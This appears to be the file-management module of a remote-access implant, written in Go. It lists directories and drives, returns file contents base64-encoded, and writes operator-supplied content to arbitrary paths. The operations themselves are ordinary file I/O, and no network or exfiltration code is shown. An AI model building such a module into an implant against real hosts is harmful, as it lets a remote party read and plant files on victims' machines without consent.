package implant

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"time"
	"unicode/utf8"

	"golang.org/x/text/encoding/simplifiedchinese"
)

// FileInfo describes a single file or directory entry.
type FileInfo struct {
	Name    string `json:"name"`
	Path    string `json:"path"`
	IsDir   bool   `json:"is_dir"`
	Size    int64  `json:"size"`
	ModTime string `json:"mod_time"`
}

// ListDir returns a JSON-encoded list of directory entries.
// On Windows, non-UTF-8 filenames are converted from GBK to UTF-8.
func ListDir(dirPath string) ([]byte, error) {
	if dirPath == "" {
		dirPath = "."
	}

	entries, err := os.ReadDir(dirPath)
	if err != nil {
		return nil, fmt.Errorf("reading directory %s: %w", dirPath, err)
	}

	absPath, _ := filepath.Abs(dirPath)
	var files []FileInfo

	for _, e := range entries {
		info, err := e.Info()
		if err != nil {
			continue
		}
		fullPath := filepath.Join(absPath, e.Name())
		name := e.Name()
		// On Windows, ensure filenames are valid UTF-8; treat as GBK if not.
		if runtime.GOOS == "windows" && !utf8.ValidString(name) {
			nameBytes := []byte(name)
			if converted, ok := tryGBKToUTF8(nameBytes); ok {
				name = string(converted)
			}
		}
		files = append(files, FileInfo{
			Name:    name,
			Path:    fullPath,
			IsDir:   e.IsDir(),
			Size:    info.Size(),
			ModTime: info.ModTime().Format(time.RFC3339),
		})
	}

	// Sort: directories first, then by name
	sort.Slice(files, func(i, j int) bool {
		if files[i].IsDir != files[j].IsDir {
			return files[i].IsDir
		}
		return strings.ToLower(files[i].Name) < strings.ToLower(files[j].Name)
	})

	result := map[string]interface{}{
		"path":  absPath,
		"files": files,
	}
	data, err := json.Marshal(result)
	if err != nil {
		return nil, fmt.Errorf("marshaling file list: %w", err)
	}
	return data, nil
}

// ReadFile reads a file and returns base64-encoded content.
// On Windows, auto-detects GBK encoding and converts to UTF-8 for display.
func ReadFileContent(filePath string) ([]byte, error) {
	const maxSize = 10 * 1024 * 1024 // 10 MB limit for MVP

	info, err := os.Stat(filePath)
	if err != nil {
		return nil, fmt.Errorf("stat %s: %w", filePath, err)
	}
	if info.IsDir() {
		return nil, fmt.Errorf("%s is a directory", filePath)
	}
	if info.Size() > maxSize {
		return nil, fmt.Errorf("file too large: %d bytes (max %d)", info.Size(), maxSize)
	}

	data, err := os.ReadFile(filePath)
	if err != nil {
		return nil, fmt.Errorf("reading %s: %w", filePath, err)
	}

	// Encoding detection and conversion for text files on Windows.
	// Binary files are left untouched (returned as raw base64).
	encoding := "binary"
	displayData := data
	if runtime.GOOS == "windows" && len(data) > 0 {
		if utf8.Valid(data) {
			encoding = "utf-8"
		} else if converted, ok := tryGBKToUTF8(data); ok {
			displayData = converted
			encoding = "gbk"
		}
		// If neither UTF-8 nor GBK, treat as binary — return raw bytes.
	}

	// Return as JSON with base64 content and encoding hint
	result := map[string]interface{}{
		"path":     filePath,
		"size":     len(data),
		"encoding": encoding,
		"content":  base64.StdEncoding.EncodeToString(displayData),
	}
	jsonData, err := json.Marshal(result)
	if err != nil {
		return nil, fmt.Errorf("marshaling file content: %w", err)
	}
	return jsonData, nil
}

// tryGBKToUTF8 attempts to convert GBK bytes to UTF-8.
// Returns the converted bytes and true if the GBK decoder accepted the input.
func tryGBKToUTF8(data []byte) ([]byte, bool) {
	decoder := simplifiedchinese.GBK.NewDecoder()
	utf8Bytes := make([]byte, len(data)*3) // worst-case expansion
	nDst, nSrc, err := decoder.Transform(utf8Bytes, data, false)
	if err != nil && nSrc == 0 {
		// Transform rejected the input entirely — not GBK
		return nil, false
	}
	// Flush any remaining state
	nFlush, _, _ := decoder.Transform(utf8Bytes[nDst:], nil, true)
	return utf8Bytes[:nDst+nFlush], true
}

// WriteFileContent writes base64-encoded content to a file.
// Content is written as UTF-8 (the web UI sends UTF-8).
func WriteFileContent(args string) ([]byte, error) {
	parts := strings.SplitN(args, "|", 2)
	if len(parts) != 2 {
		return nil, fmt.Errorf("invalid writefile arguments, expected: <path>|<base64-content>")
	}

	filePath := parts[0]
	content, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		return nil, fmt.Errorf("decoding content: %w", err)
	}

	// Create parent directories if needed
	dir := filepath.Dir(filePath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return nil, fmt.Errorf("creating directory %s: %w", dir, err)
	}

	if err := os.WriteFile(filePath, content, 0644); err != nil {
		return nil, fmt.Errorf("writing %s: %w", filePath, err)
	}

	return []byte(fmt.Sprintf("Written %d bytes to %s", len(content), filePath)), nil
}

// ListDrives returns JSON list of available drives (Windows) or root (Linux).
func ListDrives() ([]byte, error) {
	var drives []map[string]interface{}

	// On Windows, enumerate drive letters
	// On Linux, just return "/"
	if isWindows() {
		for _, drive := range getWindowsDrives() {
			drives = append(drives, map[string]interface{}{
				"name": drive,
				"path": drive,
			})
		}
	} else {
		drives = append(drives, map[string]interface{}{
			"name": "/",
			"path": "/",
		})
	}

	// Also add common directories
	result := map[string]interface{}{
		"drives": drives,
	}
	data, _ := json.Marshal(result)
	return data, nil
}

func isWindows() bool { return runtime.GOOS == "windows" }

func getWindowsDrives() []string {
	var drives []string
	for c := 'A'; c <= 'Z'; c++ {
		path := string(c) + ":\\"
		if _, err := os.Stat(path); err == nil {
			drives = append(drives, path)
		}
	}
	return drives
}

// formatSize returns a human-readable file size.
func formatSize(size int64) string {
	const unit = 1024
	if size < unit {
		return fmt.Sprintf("%d B", size)
	}
	div, exp := int64(unit), 0
	for n := size / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(size)/float64(div), "KMGTPE"[exp])
}

func init() {
	_ = formatSize // avoid unused warning
}
